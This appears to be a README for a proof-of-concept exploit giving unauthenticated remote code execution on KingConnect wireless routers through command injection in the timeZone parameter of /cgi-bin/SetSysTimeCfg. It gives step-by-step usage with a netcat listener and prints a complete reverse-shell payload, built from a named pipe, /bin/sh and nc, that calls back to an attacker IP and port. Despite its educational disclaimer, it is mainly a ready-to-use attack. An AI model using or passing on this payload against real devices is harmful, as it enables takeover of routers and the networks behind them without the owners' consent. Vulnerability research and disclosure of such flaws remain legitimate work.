# KingConnect Wireless Router PoC: Unauthenticated Remote Code Execution

## Overview
- This repository contains a Proof-of-Concept (PoC) exploit for an Unauthenticated Remote Code Execution (RCE) vulnerability in KingConnect wireless routers. The exploit leverages a vulnerability in the /cgi-bin/SetSysTimeCfg endpoint, allowing attackers to execute arbitrary commands without authentication.

## Disclaimer
- This PoC is for educational and research purposes only. Unauthorized exploitation of this vulnerability on systems without explicit consent is illegal and unethical. Use this script responsibly and only in environments where you have proper authorization.

## Explot Details
- Affected Endpoint: /cgi-bin/SetSysTimeCfg
- Vulnerability: Lack of input sanitization allows the injection of shell commands via the timeZone parameter.
- Impact: Full remote command execution on the device.
- Requirements: Attackers must be able to reach the router over HTTP.

## Usage

### Prerequisites
- A Netcat listener running on the attacker's machine to catch the reverse shell.

`nc -lvnp <PORT>`

### Steps to Execute
1. Clone this repository

`https://github.com/badbiddy/KingConnect-Router-RCE.git`

`cd kingconnect-rce-poc`

2. Run the script

`python3 kingconnect_rce.py`

3. Input the following details when prompted
 - The IP address of the target KingConnect router.
 - The IP address of your Netcat listener.
 - The port number of your Netcat listener.

4. Upon successful execution, a reverse shell will connect to your Netcat listener.

## Technical Summary
- Vulnerable Parameter: timeZone
- The timeZone parameter is vulnerable to shell command injection due to insufficient input validation. By injecting a payload using | (pipe) and other shell operators, an attacker can execute arbitrary commands.

Sample Malicious Payload:

`|rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip> <attacker_port> >/tmp/f &&`

## License
- This project is licensed under the MIT License.
